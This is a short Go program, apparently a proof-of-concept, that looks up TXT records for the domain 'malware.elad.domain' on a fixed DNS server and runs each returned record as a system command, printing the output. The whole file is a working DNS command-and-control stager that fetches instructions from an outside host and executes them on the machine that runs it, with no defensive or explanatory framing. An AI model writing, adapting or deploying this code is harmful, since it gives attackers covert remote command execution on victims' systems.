package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func main() {
	// Specify the FQDN and DNS server
	fqdn := "malware.elad.domain"
	dnsServer := "10.0.0.60"

	// Create a custom resolver
	r := net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, "udp", dnsServer+":53")
		},
	}

	// Query TXT records
	txtRecords, err := r.LookupTXT(context.Background(), fqdn)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Loops on recieved TXT records
	for _, txt := range txtRecords {
		fmt.Println(txt)

		// Define the command and parameters
		cmd := exec.Command(txt)

		// Execute the command
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Fatalf("cmd.Run() failed with %s\n", err)
		}

		// Print the output
		fmt.Printf("Combined output:\n%s\n", string(output))
	}

}
